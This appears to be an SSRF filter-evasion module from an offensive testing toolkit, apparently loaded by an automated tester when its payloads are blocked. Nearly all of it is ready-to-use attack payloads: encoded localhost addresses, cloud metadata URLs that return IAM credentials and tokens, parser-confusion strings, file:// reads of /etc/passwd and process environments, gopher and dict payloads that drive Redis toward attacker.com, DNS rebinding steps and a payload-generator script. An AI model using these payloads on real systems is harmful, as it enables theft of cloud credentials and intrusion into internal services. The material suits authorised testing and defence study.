# BYPASS MODULE — SSRF Filter Evasion
# Layer: shared/bypass
# Load when SSRF payload is blocked by URL validation or allowlist

## THEORY

SSRF filters typically validate the destination URL before the request is made.
Bypasses exploit the gap between URL parsing at validation time
and URL resolution at request time.

---

## 1. LOCALHOST VARIANTS

When 127.0.0.1 and localhost are blocked:

```
# Decimal variations of 127.0.0.1
http://2130706433/          -- decimal representation of 127.0.0.1
http://017700000001/        -- octal
http://0x7f000001/          -- hex
http://0177.0.0.1/          -- mixed octal
http://127.1/               -- shortened (127.0.0.1 without middle octets)
http://127.0.1/
http://0/                   -- 0.0.0.0 → routes to localhost on Linux
http://[::1]/               -- IPv6 loopback
http://[::ffff:127.0.0.1]/  -- IPv4-mapped IPv6
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://[::]/ 

# DNS that resolves to localhost
http://localtest.me/        -- always resolves to 127.0.0.1
http://127.0.0.1.nip.io/    -- nip.io wildcard DNS
http://spoofed.burpcollaborator.net/  -- attacker-controlled DNS

# Case variation (some validators are case-sensitive)
http://LOCALHOST/
http://LocalHost/
```

---

## 2. CLOUD METADATA ENDPOINTS

```bash
# AWS EC2 metadata (critical — grants IAM credentials)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# AWS IPv6 metadata
http://[fd00:ec2::254]/latest/meta-data/

# AWS IMDSv2 (requires token — but if app makes two requests, both may follow)
# First: PUT to get token, then GET with token

# GCP metadata
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires header: Metadata-Flavor: Google

# Azure metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true

# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/account-id

# Oracle Cloud
http://169.254.169.254/opc/v1/instance/
```

---

## 3. URL PARSER CONFUSION

Exploiting differences between how the validator and the HTTP client parse URLs:

```bash
# Credential confusion — validator sees "target.com" as host, client sees "evil.com"
http://target.com@evil.com/
http://target.com:80@evil.com/
https://expected.com#@evil.com/       -- fragment tricks some validators
https://expected.com?redirect=@evil.com/

# Fragment confusion
http://evil.com#expected.com          -- validator checks hostname incl. fragment
http://evil.com/path?x=https://allowed.com  -- param tricks allowlist check

# Path confusion with ../ after hostname (some validators only check hostname)
http://evil.com/https://allowed.com/../../
http://allowed.com.evil.com/

# Port confusion
http://127.0.0.1:80@evil.com:80/
http://evil.com:80#@127.0.0.1/

# Backslash confusion (interpreted as / by some HTTP clients, not parsers)
http://127.0.0.1\@evil.com/
http://evil.com\127.0.0.1/

# Unicode/punycode domain confusion
http://еvil.com/     -- Cyrillic е looks like Latin e
http://xn--vil-1na.com/   -- punycode form

# IP address range confusion
http://169.254.169.254/   -- EC2 metadata
http://169.254.169.253/   -- 1 less than metadata — some validators check exact IP
http://169.254.169.255/   -- 1 more
```

---

## 4. PROTOCOL / SCHEME BYPASSES

When http:// is validated but other schemes are not:

```
file:///etc/passwd           -- local file read
file://localhost/etc/passwd
file:///proc/self/environ    -- environment variables (may contain secrets)
file:///proc/self/cmdline    -- process command line

dict://127.0.0.1:6379/       -- Redis commands via DICT protocol
dict://127.0.0.1:6379/config:set:dir:/tmp
dict://127.0.0.1:6379/slaveof:attacker.com:1234

gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a   -- Redis via Gopher
gopher://127.0.0.1:25/_EHLO%20attacker.com   -- SMTP via Gopher

ftp://127.0.0.1/
ldap://127.0.0.1:389/
tftp://attacker.com/malicious
```

---

## 5. DNS REBINDING

Used when the filter validates DNS at request time, but the application
re-resolves the hostname when making the actual connection.

```
Technique:
1. Register a domain with a very low TTL (0-1 seconds)
2. Respond with a valid external IP during validation
3. Before the app makes the real request, change DNS to point to 127.0.0.1
4. App's HTTP client resolves again → gets 127.0.0.1 → internal request

Tools:
- rbndr.us: http://EXTERNAL_IP.INTERNAL_IP.rbndr.us
  Example: http://1.2.3.4.127.0.0.1.rbndr.us — alternates between both IPs

- singularity of origin: https://github.com/nccgroup/singularity
  Full DNS rebinding attack framework

- Burp Collaborator with custom DNS TTL
```

---

## 6. REDIRECT CHAINS

When the validator checks the initial URL but the HTTP client follows redirects:

```bash
# Set up a redirect on attacker-controlled server:
# https://attacker.com/r → 302 → http://169.254.169.254/latest/meta-data/

# OR use public redirect services (URL shorteners):
# Some programs accept http://bit.ly/xxxxx which redirects to internal IP

# PHP redirect:
<?php header('Location: http://169.254.169.254/latest/meta-data/'); ?>

# Open redirect on trusted domain → chain to SSRF
# If target.com has an open redirect:
http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/
# Validator sees target.com (trusted) → client follows redirect → internal

# 30x status code variations:
301 Moved Permanently     -- cached by client
302 Found                 -- standard redirect  
303 See Other             -- GET redirect
307 Temporary Redirect    -- preserves method (important for POST)
308 Permanent Redirect    -- preserves method
```

---

## 7. BYPASS DETECTION PAYLOAD SET

Automated sweep — test all localhost variants systematically:

```python
#!/usr/bin/env python3
"""ssrf_payloads.py — generate SSRF bypass payload list"""

payloads = [
    # Localhost variants
    "http://127.0.0.1/",
    "http://localhost/",
    "http://2130706433/",
    "http://017700000001/",
    "http://0x7f000001/",
    "http://127.1/",
    "http://0/",
    "http://[::1]/",
    "http://[::ffff:127.0.0.1]/",
    "http://127.0.0.1.nip.io/",
    "http://localtest.me/",
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Parser confusion
    "http://127.0.0.1@evil.com/",
    "http://evil.com#127.0.0.1",
    "http://127.0.0.1\\@evil.com/",
    # Schemes
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/",
    "gopher://127.0.0.1:6379/_PING",
]

for p in payloads:
    print(p)
```
